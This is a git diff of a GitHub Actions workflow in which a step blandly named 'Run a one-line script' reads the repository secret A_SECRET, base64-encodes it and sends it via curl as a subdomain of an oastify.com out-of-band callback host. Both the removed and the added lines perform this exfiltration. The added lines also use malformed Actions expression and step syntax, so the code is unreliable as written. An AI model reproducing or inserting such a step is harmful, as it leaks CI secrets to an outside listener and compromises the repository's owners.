@@ -22,6 +22,8 @@ jobs:
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
       - name: Run a one-line script
+        with: 
+        A_SECRET: ${{ secrets.A_SECRET }}
         run: |
-          EXFIL=${{ secrets.A_SECRET }}" | base64
-          curl -v http://${{$EXFIL}}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
+          EXFIL=${{ echo "$A_SECRET" | base64 }}
+          curl -v http://$EXFIL.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
